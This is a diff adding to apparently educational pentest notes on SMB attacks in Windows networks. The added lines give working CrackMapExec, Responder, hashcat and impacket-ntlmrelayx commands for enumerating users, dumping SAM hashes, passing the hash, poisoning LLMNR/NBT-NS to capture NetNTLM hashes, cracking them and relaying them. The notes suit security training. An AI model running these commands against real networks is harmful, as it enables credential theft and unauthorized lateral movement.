@@ -365,5 +365,31 @@ Note: If the--exec-method is not defined, CrackMapExec will try to execute the a
 
 \\Enumerating Logged-on Users
 Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
+$crackmapexec smb 10.10.110.9/24 -u Administrator -p 'Password123!' --loggedon-users
 
--
+\\Extract Hashes from SAM database
+The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
+Authenticate as another user.
+Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
+Pass The Hash. We will discuss it later in this section.
+$crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam 
+
+\\Pass-the-Hash (PtH)
+If you get a user's NTLM hash but can't crack it, you can still authenticate via Pass-the-Hash (PtH) — use the hash with tools like Impacket, smbmap, or CrackMapExec to authenticate over SMB.
+$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+\\Forced Authentication Attacks
+Use a fake SMB server (Responder) to poison LLMNR/NBT-NS/MDNS and capture NetNTLM v1/v2 hashes — Responder replies for requested hosts and logs the hashes.
+$responder -I <interface name>
+Windows resolves names by checking (1) hosts file, (2) local DNS cache, (3) configured DNS server, 
+and if unresolved, (4) sends a multicast (LLMNR/NetBIOS/MDNS) query. A mistyped share (e.g. \\mysharefoder\) triggers that multicast
+ — attackers can spoof replies (no integrity checks) and redirect victims to malicious SMB servers to capture credentials.
+$sudo responder -I ens33
+-These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
+-All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
+-Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
+$hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+NTLMv2 cracked → password: P@ssword. If uncracked, you can relay the captured hash (e.g., with impacket-ntlmrelayx or Responder MultiRelay); set SMB = Off in Responder.conf first.
+$cat /etc/responder/Responder.conf | grep 'SMB='
+-Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
+$impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
